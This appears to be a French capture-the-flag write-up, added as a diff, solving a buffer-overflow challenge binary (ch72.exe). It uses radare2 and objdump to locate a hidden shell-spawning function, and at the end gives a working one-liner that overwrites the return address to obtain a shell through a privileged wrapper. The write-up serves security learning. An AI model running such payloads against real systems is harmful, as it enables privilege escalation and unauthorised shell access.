@@ -1,0 +1,22 @@
+Solution :
+    - radare2 ch72.exe
+    - aa : pour analyser les strings
+    - afl : pour afficher les fonctions mais on ne voit pas la fonction "admin_shell" car elle n'est pas appelé dans le main, on voit la fonction main et la fonction entry0 qui est l'entrée du programme
+    - pdf @ main :
+        push ebp --> sauvegarde en haut de la pile la valeur de ebp
+        mov ebp, esp --> met ebp à la valeur de esp (qui pointe vers le haut de la pile)
+        sub esp, 0x14 --> reserver de l'espace sur la pile de la taille : 0x14 = 20
+        --> 20 + une adresse de pointeur (ebp) de 4 octet = 24
+    - il faut qu'on récupère l'adresse ImageBase car c'est ici que l'executable est chargé en mémoire et l'adresse BaseOfCode car c'est l'offset auquel le code va se lancer : objdump -x -D ch72.exe | more : 
+        ImageBase : 0x00400000
+        BaseOfCode : 0x00001000
+        --> le code se lance à l'adresse : 0x00401000
+    - on va à cette adresse dans r2 : s 0x00401000
+    - on print les 20 prochaines lignes : pd 20 :
+        push ebp --> classique début de fonction (sauvegarde de la pile)
+        mov ebp, esp --> classique début de fonction (sauvegarde de la pile)
+        push str.C:Windows_system32cmd.exe
+        call 0x403bcc --> sans doute cette ligne de code : system("C:\\Windows\\system32\\cmd.exe");
+    - l'adresse de la fonction à appelé est donc l'adresse de l'avant dernière ligne dernière ligne : 0x00401003
+    - (python -c 'print("A"*24+"\x03\x10\x40\x00")'; cat) | ./ch72.exe --> pour vérifier
+    - (python -c 'print("A"*24+"\x03\x10\x40\x00")'; cat) | ./wrapper.sh --> car il a tout les droits (le cat sert à ne pas perdre le shell)
